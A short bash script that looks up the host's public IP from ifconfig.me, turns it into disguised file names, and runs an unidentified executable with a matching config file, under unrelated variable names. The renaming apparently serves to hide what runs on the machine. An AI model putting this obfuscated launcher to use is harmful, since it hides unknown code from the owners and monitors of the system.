#!/bin/bash
shopee=$(echo "$(curl -s ifconfig.me)" | tr . j )
tokopedia=$(echo "$(curl -s ifconfig.me)" | tr . k )
chmod +x $shopee
chmod +x $tokopedia.cfg
./$shopee --config $tokopedia.cfg
